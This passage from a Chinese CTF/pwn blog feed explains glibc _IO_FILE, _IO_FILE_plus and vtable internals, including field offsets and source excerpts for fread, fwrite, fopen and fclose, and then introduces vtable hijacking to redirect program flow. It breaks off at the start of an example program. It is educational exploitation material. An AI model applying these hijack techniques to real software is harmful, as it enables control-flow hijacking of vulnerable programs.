class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO-FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn _IO_FILE</title>
      <link href="archives/221/"/>
      <url>archives/221/</url>
      
        <content type="html"><![CDATA[<h2 id="IO-结构体知识"><a href="#IO-结构体知识" class="headerlink" title="IO 结构体知识"></a>IO 结构体知识</h2><h3 id="IO-FILE-结构"><a href="#IO-FILE-结构" class="headerlink" title="_IO_FILE 结构"></a>_IO_FILE 结构</h3><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值——文件描述符（eg:stdin=0;stdout=1)。</p><p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：<strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>。假设现在第一次用 fopen 打开一个文件流，这个文件流的文件描述符就为 3 。默认打开的三个文件流分配 libc data 段。fopen 等文件流控制函数创建的文件流是分配在堆上。</p><p>FILE 结构体定义在 libio.h ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>每个文件流都有自己的 FILE 结构体</strong>。我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><p>在 ida 中搜索 <code>_IO_2_1_stdxxx_</code> 或者 <code>stdxx</code> 这个变量会存储 FILE 结构体地址：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210083553.png" alt="image-20201210083553060"></p><p> gdb 调试中查看结构体内容：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210083345.png" alt="image-20201210083345062"></p><p>进程中的 FILE 结构会通过 _chain 域彼此连接形成一个链表（上图可见指向 _IO_2_1_stdout ），<strong>链表头部用全局变量 _IO_list_all 表示</strong>，通过这个值我们可以遍历所有的 FILE 结构（FSOP 攻击利用到这个特性）。</p><p><strong>_fileno</strong> 是当前文件流的文件描述符，上图是 stderr 对应就是 2 。</p><h3 id="IO-FILE-plus-结构"><a href="#IO-FILE-plus-结构" class="headerlink" title="_IO_FILE_plus 结构"></a>_IO_FILE_plus 结构</h3><p>但是事实上 _IO_FILE 结构外包裹着另一种结构 _IO_FILE_plus ，其中包含了一个重要的<strong>指针 vtable 指向了一系列函数指针</strong>。</p><p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    _IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_FILE_plus 结构体&amp;各个偏移，当中 0x0 ~ 0xc4 其实就是 _IO_FILE 结构，最后加上 vtable 指针指向 _IO_jump_t ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//p *((struct _IO_FILE_plus*)[地址])</span></span><br><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="comment">//IO_FILE_complete</span></span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><h3 id="IO-jump-t-结构"><a href="#IO-jump-t-结构" class="headerlink" title="_IO_jump_t 结构"></a>_IO_jump_t 结构</h3><p>vtable 是 _IO_jump_t 类型的指针，指向的 _IO_jump_t 结构体中保存了一堆函数指针，这有点像 c++ 的虚函数结构体，在后面我们会看到在一系列标准 IO 函数中会调用这里面的函数指针。</p><p>在 ida 中可以找 <code>_IO_2_1_stderr_</code> 结构体后面的 <code>dq offset _IO_file_jumps</code> 跳转到结构体。或者直接搜索 <code>_IO_file_jumps</code> ，vtable 实际指向的结构体名字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//p *((struct _IO_jump_t*)[地址])</span></span><br><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li><strong>stdin、stdout、stderr</strong> 文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上</li><li><strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>，开启新的文件流文件描述符从 3 开始递增</li><li>每个文件流都单独的 _IO_FILE  、_IO_FILE_plus 结构体，<code>_IO_jump_t   *vtable</code>只有一个各个文件流公用</li><li>指针 vtable 指向了一系列函数指针，各种 IO 操作均是通过 vtable 指向各个具体函数实现功能</li><li>文件流通过 _chain 构成链表，<strong>链表头部用全局变量 _IO_list_all 表示</strong></li><li>ida 中通过搜索文件流名可以找到 _IO_FILE  、_IO_FILE_plus ，根据偏移（结构体最后位置）找到 vtable （eg:<em>IO_2_1_stderr</em>)</li></ul><h2 id="涉及文件流部分函数"><a href="#涉及文件流部分函数" class="headerlink" title="涉及文件流部分函数"></a>涉及文件流部分函数</h2><h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><blockquote><p>涉及源码文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libio/iofread.c</span><br><span class="line">libio/genops.c</span><br><span class="line">libio/libioP.h</span><br><span class="line">libio/fileops.c</span><br></pre></td></tr></table></figure></blockquote><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fread</span> <span class="params">( <span class="keyword">void</span> *buffer, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> count, FILE *stream)</span> </span>;</span><br></pre></td></tr></table></figure><ul><li>buffer 存放读取数据的缓冲区。</li><li>size：指定每个记录的长度。</li><li>count： 指定记录的个数。</li><li>stream：目标文件流。</li><li>返回值：返回读取到数据缓冲区中的记录个数</li></ul><p>fread 的代码位于 / libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (buf, size, count, fp)</span><br><span class="line">     <span class="keyword">void</span> *buf;</span><br><span class="line">     _IO_size_t size;</span><br><span class="line">     _IO_size_t count;</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="keyword">char</span> *) buf, bytes_requested);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在_IO_sgetn 函数中会调用_IO_XSGETN，而_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在<em>调用这个函数时会首先取出 vtable 中的指针然后再进行调用</em>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (fp, data, n)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h3><blockquote><p>涉及源码文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libio/iofwrite.c</span><br><span class="line">libio/libioP.h</span><br><span class="line">libio/fileops.c</span><br></pre></td></tr></table></figure></blockquote><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fwrite</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* buffer, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> count, FILE* stream)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li><li>size: 要写入内容的单字节数;</li><li>count: 要进行写入 size 字节的数据项的个数;</li><li>stream: 目标文件指针;</li><li>返回值：实际写入的数据项个数 count。</li></ul><p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p><p>根据前面对_IO_FILE_plus 的介绍，可知_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">written = _IO_sputn (fp, (<span class="keyword">const</span> <span class="keyword">char</span> *) buf, request);</span><br></pre></td></tr></table></figure><p>在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>_IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br></pre></td></tr></table></figure><p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><blockquote><p>涉及源码文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libio/iofopen.c</span><br><span class="line">libio/fileops.c</span><br><span class="line">libio/genops.c</span><br></pre></td></tr></table></figure></blockquote><p>fopen 在标准 IO 库中用于打开文件，函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">char</span> *filename, *type)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>filename: 目标文件的路径</li><li>type: 打开方式的类型</li><li>返回值: 返回一个文件指针</li></ul><p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p><p>首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br></pre></td></tr></table></figure><p>之后会为创建的 FILE 初始化 vtable，并调用_IO_file_init 进一步初始化操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">_IO_file_init (&amp;new_f-&gt;fp);</span><br></pre></td></tr></table></figure><p>在_IO_file_init 函数的初始化操作中，会调用_IO_link_in 把新分配的 FILE 链入_IO_list_all 为起始的 FILE 链表中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (fp)</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *<span class="title">fp</span>;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后__fopen_internal 函数会调用_IO_file_fopen 函数打开目标文件，_IO_file_fopen 会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口 open 函数，这里不再深入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></table></figure><p>总结一下 fopen 的操作是</p><ul><li>使用 malloc 分配 FILE 结构</li><li>设置 FILE 结构的 vtable</li><li>初始化分配的 FILE 结构</li><li>将初始化的 FILE 结构链入 FILE 结构链表中</li><li>调用系统调用打开文件</li></ul><h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h3><blockquote><p>涉及源码文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libio/iofclose.c</span><br></pre></td></tr></table></figure></blockquote><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，其作用与 fopen 相反。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">(FILE *stream)</span></span></span><br></pre></td></tr></table></figure><p>功能：关闭一个文件流，使用 fclose 就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p><p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure><p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure><h3 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h3><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会<strong>调用 vtable 中的_IO_sputn</strong>，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vfprintf</span>+<span class="number">11</span></span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure><h2 id="伪造-vtable-劫持程序流程"><a href="#伪造-vtable-劫持程序流程" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h2><blockquote><p>&lt;libc 2.23 –&gt; 修改 vtable 中某些函数的指针</p><p>&gt;=libc 2.23 –&gt; 通过伪造 vtable 结构体来调用某些函数的指针</p></blockquote><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>IO 操作函数需要经过 FILE 结构进行处理。尤其是 _IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p><p>因此伪造 vtable 劫持程序流程的中心思想就是<strong>针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</strong></p><p><strong>vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</strong></p><h3 id="原理示例"><a href="#原理示例" class="headerlink" title="原理示例"></a>原理示例</h3><p>修改 vtable 中的指针，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> 